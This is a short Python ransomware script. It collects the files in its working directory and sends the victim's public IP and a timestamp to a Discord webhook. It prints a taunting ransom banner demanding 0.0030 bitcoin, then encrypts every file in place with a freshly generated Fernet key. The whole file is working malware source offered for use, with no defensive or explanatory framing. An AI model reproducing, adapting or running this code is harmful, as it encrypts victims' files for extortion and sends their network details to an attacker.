#!usr/bin/env python3
import os
from cryptography.fernet import Fernet
import time
import requests
from requests import get
import datetime
os.system("clear")
files=[]

for file in os.listdir():
    if file == 'en.py'or file == "enkey.key" or file == "dc.py" or file == "decrypt.txt":
        continue
    if os.path.isfile(file):
            files.append(file)

### If Ransome is ran it sends an alert to Discord server to Webhook API

ip=get("https://api.ipify.org").text
dt = datetime.datetime.now()
nowt=dt.strftime("%Y-%m-%d %H:%M:%S")

url = "YOUR DISCORD WEBHOOK GOES HERE"
x = f"""```
Ransome ran on a Computer! 
---------------------------
Target IP Address ~> {ip} 
-----------------------------------
Time ~> {nowt}```"""

r=requests.post(url, data={"content": x})



### Beginning encryption 
print("""
 
 ██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗     ██╗
 ██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝     ██║
 ██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗    ██║
 ██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║    ╚═╝
 ╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝    ██╗
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝
             ___________________________________
            [You're Computer has been fucked lol]                                           
            [Your files are Encrypted hahaha cry]              
            [So, if you feel like getting your  ]
            [files back send me [0.0030 BITCOIN]]
             -----------------------------------                                        
                          
""")
wr=("lol hi")
with open("decrypt.txt", "w+") as f:
    f.write(wr)


key=Fernet.generate_key()

with open("enkey.key", "wb") as enkey:
    enkey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        cont=thefile.read()
    cont_en = Fernet(key).encrypt(cont)
    with open(file,"wb") as thefile:
        thefile.write(cont_en)
        
input("If you are done reading press ENTER to exit\n")
exit()
